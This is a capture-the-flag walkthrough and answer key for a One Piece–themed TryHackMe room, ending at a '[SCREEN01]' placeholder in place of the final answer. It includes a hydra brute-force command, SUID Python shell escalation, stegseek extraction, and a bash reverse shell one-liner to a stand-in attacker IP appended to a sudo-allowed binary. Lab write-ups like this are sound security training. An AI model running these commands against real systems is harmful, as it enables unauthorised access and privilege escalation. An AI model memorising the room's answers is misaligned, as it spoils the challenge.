# [One Piece](https://tryhackme.com/room/ctfonepiece65)

## A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?

# Set Sail

Welcome to the One Piece room.

Your dream is to find the One Piece and hence to become the Pirate King.

Once the VM is deployed, you will be able to enter a World full of Pirates.

Please notice that pirates do not play fair. They can create rabbit holes to trap you.

This room may be a bit different to what you are used to: - Required skills to perform the intended exploits are pretty basic. - However, solving the (let's say) "enigmas" to know what you need to do may be trickier.
This room is some sort of game, some sort of puzzle.

Please note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room.

# Road Poneglyphs

## In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.

### What is the name of the tree that contains the 1st Road Poneglyph?

1. Start with an nmap scan to discover open services on the target machine.

```bash
nmap -sV <TARGET_IP>
```

**Result:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Connect to the FTP server using anonymous credentials to see if we can access any files.

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (press Enter for no password)
ls -la
```

**Result:**

```
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
```

**Answer:** The Whale

---

### What is the name of the 1st pirate you meet navigating the Apache Sea?

_Only Sea, It's Not Terrible_

1. Navigate to the web server and inspect the source code of the main page. In `view-source:http://<TARGET_IP>/` there is a commented out message that appears to be encoded multiple times. Decode it using `From Base32 > From Base64 > From Base85` to reveal: `Nami ensures there are precisely 3472 possible places where she could have lost it.` This is a hint about the size of a wordlist we need.

2. Download the custom wordlist `LogPose.txt` from the GitHub repository `https://github.com/1FreyR/LogPose`. This wordlist contains exactly 3472 entries and is specifically designed for this CTF challenge.

3. Use gobuster to perform directory enumeration with the custom wordlist.

```bash
gobuster dir -u http://<TARGET_IP>/ -w LogPose.txt -t 50 -x html,txt,php,js
```

**Result:**

```
/dr3ssr0s4.html       (Status: 200) [Size: 3985]
```

4. Visit the discovered page `http://<TARGET_IP>/dr3ssr0s4.html`. The page displays the name of the first pirate you encounter.

**Answer:** Donquixote Doflamingo

---

### What is the name of the 2nd island you reach navigating the Apache Sea?

1. Inspect the CSS file referenced in the Dressrosa page. In `view-source:http://<TARGET_IP>/css/dressrosa_style.css` there is a hidden reference to an image `king_kong_gun.jpg` inside a container id element.

2. Download the image from `http://<TARGET_IP>/king_kong_gun.jpg` and examine its metadata using exiftool.

```bash
exiftool king_kong_gun.jpg
```

**Result:**

```
ExifTool Version Number         : 13.36
File Name                       : king_kong_gun.jpg
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2025:12:30 17:43:46+01:00
File Access Date/Time           : 2025:12:30 17:43:47+01:00
File Inode Change Date/Time     : 2025:12:30 17:43:46+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : Doflamingo is /ko.jpg
Image Width                     : 736
Image Height                    : 414
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x414
Megapixels                      : 0.305
```

The Comment field reveals the next clue: `Doflamingo is /ko.jpg`.

3. Download the next image from `http://<TARGET_IP>/ko.jpg` and use strings to extract readable text from it.

```bash
strings ko.jpg
```

**Result:**

```
Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php
```

4. Navigate to `http://<TARGET_IP>/wh0l3_c4k3.php`. The page displays the name of the second island: Whole Cake Island, the territory of Big Mom.

**Answer:** Whole Cake

---

### What is the name of the friend you meet navigating the Apache Sea?

1. In the HTML source of `view-source:http://<TARGET_IP>/wh0l3_c4k3.php` there is a comment hint: `Big Mom likes cakes`. This suggests we need to manipulate something related to cakes.

2. Open your browser's Developer Tools (F12) and navigate to `Storage > Cookies`. Change the cookie value from `NoCakeForYou` to `CakeForYou` and refresh the page.

3. After refreshing with the modified cookie, a new message appears:

```
You successfully stole a copy of the 2nd Road Poneglyph: FUW...LJA<br/>
        You succeed to run away but you don't own a Log Pose to go to Kaido's Island, you are sailing without even knowing where you are heading to.<br/>
        You end up reaching a strange island: /r4nd0m.html
```

This gives us the second fragment of the Road Poneglyph and points us to a new location.

4. Visit `http://<TARGET_IP>/r4nd0m.html`. The page displays the name of a friend who helps Luffy throughout his journey.

**Answer:** Buggy the Clown

---

### What is the name of the 2nd Emperor you meet navigating the Apache Sea?

1. On the `/r4nd0m.html` page, there are links to various games created by Buggy. Inspect the source code of one of these games at `view-source:http://<TARGET_IP>/buggy_games/brain_teaser.js`. Hidden in the JavaScript code, you'll find another URL: `/0n1g4sh1m4.php`.

2. Navigate to `http://<TARGET_IP>/0n1g4sh1m4.php`. The page displays the name of one of the Four Emperors and shows a login form.

**Answer:** Kaido of the Beasts

---

### What is the hidden message of the 4 Road Poneglyphs?

1. Connect to the FTP server and navigate to the hidden directory discovered earlier.

```bash
cd .the_whale_tree
ls -la
mget .road_poneglyph.jpeg
```

2. Use stegseek to extract hidden data from the image. Stegseek will automatically try common passwords and extract the hidden content.

```bash
stegseek road_poneglyph.jpeg
```

3. The second fragment was already obtained when we changed the cookie on `http://<TARGET_IP>/wh0l3_c4k3.php` to `CakeForYou`.

4. Download the image from `http://<TARGET_IP>/images/kaido.jpeg`. Notice this is the only image with a `.jpeg` extension while others use `.png`, making it suspicious. Run it through stegseek to extract hidden credentials.

```bash
stegseek kaido.jpeg
```

**Result:**

```
Username:K1ng_0f_th3_B3@sts
```

5. Use hydra to brute force the login form on the `http://<TARGET_IP>/0n1g4sh1m4.php` page using the discovered username and the rockyou wordlist.

```bash
hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -t 50
```

**Result:**

```
login: K1ng_0f_th3_B3@sts   password: thebeast
```

6. Log in to `http://<TARGET_IP>/0n1g4sh1m4.php` with the credentials `K1ng_0f_th3_B3@sts:thebeast`. After successful authentication, you'll receive the third fragment of the Road Poneglyph.

7. After logging in to Kaido's page, besides the third fragment, you'll see a message stating: `Unfortunately, the location of this last Poneglyph is unspecified`. This is a hint - navigate to `http://<TARGET_IP>/unspecified` to find the fourth and final fragment.

8. Gather all four fragments and decode them using [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe chain: `From Base32 > From Morse Code > From Binary > From Hex > From Base58 > From Base64`.

**Answer:** `M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!`

---

# Laugh Tale

## You are now able to reach Laugh Tale. Can you find the One Piece?

### Who is on Laugh Tale at the same time as Luffy?

1. Use the decoded credentials to log in via SSH as Luffy.

```bash
ssh M0nk3y_D_7uffy@<TARGET_IP>
# Password: 1_w1ll_b3_th3_p1r@t3_k1ng!
```

2. List files in Luffy's home directory and read the `laugh_tale.txt` file.

```bash
ls -la /home/luffy
cat /home/luffy/laugh_tale.txt
```

The file reveals the name of another character who has reached Laugh Tale at the same time.

**Answer:** `Marshall D Teach`

---

### What allowed Luffy to win the fight?

1. Search for SUID binaries on the system, which are programs that run with elevated privileges.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the results, one binary stands out: `/usr/bin/gomugomunooo_king_kobraaa`.

2. Execute the suspicious SUID binary to see what it does.

```bash
/usr/bin/gomugomunooo_king_kobraaa
```

**Result:**

```
Python 3.6.9 (default, Jul 17 2020, 12:50:27)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

The binary is actually Python interpreter renamed with SUID permissions!

3. Consult [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) for Python SUID exploitation techniques and execute the privilege escalation exploit.

```bash
/usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
# 7uffy_vs_T3@ch
```

4. Explore the new user's home directory to find information about the fight's outcome.

```bash
ls -la /home/teach/
cat /home/teach/luffy_vs_teach.txt
```

**Answer:** Willpower

---

### What is the One Piece?

1. Look for additional credentials or hints in Teach's home directory.

```bash
cat /home/teach/.password.txt
```

**Result:** `7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?`

2. Switch to the `7uffy_vs_T3@ch` user with the discovered password and check sudo privileges.

```bash
exit
su 7uffy_vs_T3@ch
# Password: Wh0_w1ll_b3_th3_k1ng?
sudo -l
```

**Result:**:

```
User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```

The user can run `less` with sudo privileges. Let's check the permissions on the binary itself.

```bash
ls -la /usr/local/bin
```

```
-rwxrwx-wx  1 root root   67 Aug 14  2020 less
```

3. Set up a netcat listener on your attacking machine to receive the reverse shell.

```bash
nc -lvnp 4444
```

4. Replace the `less` binary with a bash reverse shell one-liner and execute it with sudo.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /usr/local/bin/less
sudo /usr/local/bin/less
```

You should now have a root shell in your netcat listener!

5. Search the entire system for files containing the phrase "One Piece".

```bash
grep -iRl "One Piece" /home /usr 2> /dev/null
```

One interesting result appears: `/usr/share/mysterious/on3_p1ec3.txt`

6. Read the final file to discover what the One Piece actually is.

```bash
cat /usr/share/mysterious/on3_p1ec3.txt
```

[SCREEN01]
